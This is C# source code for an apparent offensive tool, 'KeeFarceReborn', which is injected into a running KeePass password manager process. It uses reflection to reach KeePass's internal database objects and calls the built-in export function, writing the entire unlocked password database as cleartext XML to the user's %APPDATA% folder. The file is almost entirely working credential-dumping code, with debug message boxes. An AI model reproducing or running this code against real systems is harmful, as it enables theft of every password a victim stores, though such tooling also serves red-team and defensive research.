using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace KeeFarceReborn
{
    public static class Program
    {
        public static void Main()
        {
            // checking that we are injected in the KeePass process
            string processName = Process.GetCurrentProcess().ProcessName;
            int processId = Process.GetCurrentProcess().Id;
            MessageBox.Show("The current process is " + processName + " (" + processId.ToString() + ")");

            if (processName != "KeePass")
            {
                MessageBox.Show("Running in the wrong process");
                return;
            }

            // checking that we are injected in the default AppDomain (could be changed depending on the shellcode generator)
            string appDomain = AppDomain.CurrentDomain.FriendlyName;
            if (appDomain != "KeePass.exe")
            {
                MessageBox.Show("Running in the wrong AppDomain");
                return;
            }

            // get the entry assembly and find the program type
            var assembly = Assembly.GetEntryAssembly();
            if (assembly.GetName().Name != "KeePass")
            {
                MessageBox.Show("Failed to retrieve KeePass assembly");
                return;
            }
            var programType = assembly.EntryPoint.DeclaringType;
            MessageBox.Show("Got KeePass assembly");

            // get every object needed to export the database from KeePass main form
            foreach (var field in programType.GetFields())
            {
                MessageBox.Show(field.Name + " " + field.GetHashCode().ToString());
            }

            var bindingFlagsStatic = BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static;
            var bindingFlagsInstance = BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance;
            var mainFormField = ((IReflect)programType).GetField("m_formMain", bindingFlagsStatic);
            var mainForm = mainFormField.GetValue(null);
            var documentManagerField = mainForm.GetType().GetField("m_docMgr", bindingFlagsInstance);
            var documentManager = documentManagerField.GetValue(mainForm);
            var activeDocumentField = documentManager.GetType().GetField("m_dsActive", bindingFlagsInstance);
            var activeDocument = activeDocumentField.GetValue(documentManager);
            var databaseField = activeDocument.GetType().GetField("m_pwDb", bindingFlagsInstance);
            var database = databaseField.GetValue(activeDocument);
            var rootGroupField = database.GetType().GetField("m_pgRootGroup", bindingFlagsInstance);
            var rootGroup = rootGroupField.GetValue(database);
            MessageBox.Show("Found every object we need");

            // build a pwExportInfo (KeePass/DataExchange/PwExportInfo.cs) object based on the gathered objects 
            object[] pwExportInfoParams = new object[3];
            pwExportInfoParams[0] = rootGroup;
            pwExportInfoParams[1] = database;
            pwExportInfoParams[2] = true;

            Type pwExportType = assembly.GetType("KeePass.DataExchange.PwExportInfo");
            object pwExportInfo = Activator.CreateInstance(pwExportType, pwExportInfoParams);
            MessageBox.Show("Built pwExportInfo object");

            // invoke Export method (KeePass/DataExchange/ExportUtils.cs)
            Type fileProviderType = assembly.GetType("KeePass.DataExchange.Formats.KeePassXml2x");
            object fileProvider = Activator.CreateInstance(fileProviderType, null);
            string exportFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "export.xml");

            object[] exportMethodParams = new object[3];
            exportMethodParams[0] = pwExportInfo;
            exportMethodParams[1] = new FileStream(exportFilePath, FileMode.Create);
            exportMethodParams[2] = null;

            MethodInfo exportMethodInfo = fileProviderType.GetMethod("Export");
            exportMethodInfo.Invoke(fileProvider, exportMethodParams);
            MessageBox.Show("Called Export method, check %APPDATA% for cleartext database export in XML");
        }
    }
}
